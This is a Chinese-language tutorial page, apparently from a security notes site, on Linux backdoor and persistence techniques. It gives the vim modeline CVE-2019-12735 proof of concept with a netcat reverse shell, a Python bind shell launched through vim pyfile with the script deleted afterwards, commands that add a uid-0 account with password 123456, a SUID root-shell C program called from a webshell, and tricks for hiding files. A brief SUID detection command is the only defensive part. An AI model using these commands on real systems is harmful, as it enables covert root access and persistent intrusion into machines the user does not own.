<h2 class="anchor anchorWithStickyNavbar_LWe7" id="vim后门">vim后门<a href="#vim后门" class="hash-link" aria-label="vim后门的直接链接" title="vim后门的直接链接">​</a></h2>
<p><strong>vim modeline CVE-2019-12735</strong></p>
<p>该漏洞存在于编辑器的 modeline功能，部分 Linux 发行版默认启用了该功能，macOS 是没有默认启用。 当vim打开一个包含了vim modeline注释行的文件时，会自动读取这一行的参数配置并调整自己的设置到这个配置。vim默认关闭modeline。 开启：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">vim</span><span class="token plain"> ~/.vimrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//文件内容为</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> modeline</span><br></span></code></pre></div></div>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">poc:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">:!uname -a||&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;source\!\ \%&quot;):fdl=0:fdt=&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/15823418211344302977-f2551c37c2b79d4ebedec23ff6fac64b.jpg" width="1080" height="301" class="img_ev3q"></p>
<p>反弹shell：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">:</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">rm /tmp/f</span><span class="token punctuation" style="color:#393A34">;</span><span class="token function" style="color:#d73a49">mkfifo</span><span class="token plain"> /tmp/f</span><span class="token punctuation" style="color:#393A34">;</span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /tmp/f</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">/bin/sh </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 </span><span class="token number" style="color:#36acaa">9999</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">/tmp/f</span><span class="token operator" style="color:#393A34">||</span><span class="token string" style="color:#e3116c">&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;</span><span class="token plain">source</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">&quot;):fdl=0:fdt=&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/158234182129772116504-5fd5613b37451c28091065d3c30556f2.jpg" width="1080" height="294" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="vim-python扩展后门">vim python扩展后门<a href="#vim-python扩展后门" class="hash-link" aria-label="vim python扩展后门的直接链接" title="vim python扩展后门的直接链接">​</a></h3>
<p>适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。可以通过vim的pyfile来执行python脚本。这里我复现使用了docker centos 6.8，yum默认安装的vim。下面的pdf是发现者对外公开的思路：</p>
<blockquote>
<p><a href="https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf" target="_blank" rel="noopener noreferrer">https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf</a></p>
</blockquote>
<p>这里我们使用一个python开启本地监听11端口的脚本。 POC:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> socket </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> subprocess</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> threading</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> sys</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;__main__&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        server</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">socket</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">SOCK_STREAM</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        server</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">bind</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;0.0.0.0&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        server</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">listen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;waiting for connect&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        talk</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> server</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">accept</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;connect from&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">addr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        proc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> subprocess</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Popen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;/bin/sh&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&quot;-i&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> stdin</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">talk</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                stdout</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">talk</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> stderr</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">talk</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shell</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa">$(</span><span class="token variable function" style="color:#d73a49">nohup</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable function" style="color:#d73a49">vim</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable parameter variable" style="color:#36acaa">-E</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable parameter variable" style="color:#36acaa">-c</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable string" style="color:#e3116c">&quot;pyfile dir.py&quot;</span><span class="token variable operator" style="color:#393A34">&gt;</span><span class="token variable" style="color:#36acaa"> /dev/null </span><span class="token variable operator file-descriptor important" style="color:#393A34">2</span><span class="token variable operator" style="color:#393A34">&gt;</span><span class="token variable file-descriptor important" style="color:#36acaa">&amp;1</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">&amp;</span><span class="token variable" style="color:#36acaa">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sleep</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> dir.py</span><br></span></code></pre></div></div>
<p>执行以后：</p>
<p><img decoding="async" loading="lazy" src="data:image/jpeg;base64,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" width="541" height="42" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/assets/images/15823418215567496928-bdac33bf716dc752c4cc864632e1c67d.jpg" width="1080" height="875" class="img_ev3q"></p>
<p>我在攻击机nc连接过去就可以了。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="添加超级用户">添加超级用户<a href="#添加超级用户" class="hash-link" aria-label="添加超级用户的直接链接" title="添加超级用户的直接链接">​</a></h2>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">useradd</span><span class="token plain"> guest</span><span class="token punctuation" style="color:#393A34">;</span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;guest:123456&#x27;</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">chpasswd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">useradd</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">openssl </span><span class="token variable function" style="color:#d73a49">passwd</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable number" style="color:#36acaa">123456</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain"> guest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">useradd</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$(</span><span class="token string variable" style="color:#36acaa">openssl </span><span class="token string variable function" style="color:#d73a49">passwd</span><span class="token string variable" style="color:#36acaa"> </span><span class="token string variable number" style="color:#36acaa">123456</span><span class="token string variable" style="color:#36acaa">)</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"> guest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">useradd</span><span class="token plain"> newuwer</span><span class="token punctuation" style="color:#393A34">;</span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;123456n123456n&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">passwd</span><span class="token plain"> newuser</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 赋予root权限</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;guest:x:0:0::/:/bin/sh&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> /etc/passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;guest:123456&#x27;</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">chpasswd</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="suid后门">SUID后门<a href="#suid后门" class="hash-link" aria-label="SUID后门的直接链接" title="SUID后门的直接链接">​</a></h2>
<p>当一个文件所属主的x标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以root身份执行的。必要条件：</p>
<ul>
<li>SUID权限仅对二进制程序有效。</li>
<li>执行者对于该程序需要具有x的可执行权限</li>
<li>本权限仅在执行该程序的过程中有效</li>
<li>在执行过程中执行者将具有该程序拥有者的权限</li>
</ul>
<p>可以利用webshell进行利用</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#vim suid.c</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#include&lt;stdlib.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function-name function" style="color:#d73a49">main</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setuid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">system</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;/bin/bash&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 编译成二进制文件</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gcc suid.c </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> suidshell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 赋予suid权限</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4755</span><span class="token plain"> suidshell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> u+s suidshell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 假设webshell权限较低，希望使用suid shell执行root命令，通过web的方式调用</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># http://localhost/suid.php?path=/tmp/suidshell&amp;cmd=id</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 即可以root的权限执行命令id</span><br></span></code></pre></div></div>
<p><strong>检测</strong></p>
<p>查找具有suid权限的文件即可</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">find</span><span class="token plain"> / </span><span class="token parameter variable" style="color:#36acaa">-perm</span><span class="token plain"> +4000 </span><span class="token parameter variable" style="color:#36acaa">-ls</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> / </span><span class="token parameter variable" style="color:#36acaa">-perm</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">s </span><span class="token parameter variable" style="color:#36acaa">-type</span><span class="token plain"> f </span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">/dev/null</span><br></span></code></pre></div></div>
<p><strong>清除</strong></p>
<p>清除文件即可</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="linuxunix-隐藏文件和文件夹">Linux/Unix 隐藏文件和文件夹<a href="#linuxunix-隐藏文件和文件夹" class="hash-link" aria-label="Linux/Unix 隐藏文件和文件夹的直接链接" title="Linux/Unix 隐藏文件和文件夹的直接链接">​</a></h2>
<p><strong>建立隐藏文件/文件夹</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">touch</span><span class="token plain"> .backdoor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> .backdoor-file</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/15823418220275679836-d61172e0d68b48d83236418a095554ec.jpg" width="1080" height="549" class="img_ev3q"></p>
<p>经常使用linux中会知道每个目录下其实都有.和..、分别代指的是当前目录和上级目录。 建立...文件也是一个比较好的隐藏方法。</p>
<p><strong>建立..文件/文件夹</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;whoami&#x27;</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 注意最后一个转义符后有一个空格</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/158234182249885239715-34996fb2eab3f36e6c2656239912bc08.jpg" width="1080" height="692" class="img_ev3q"></p>
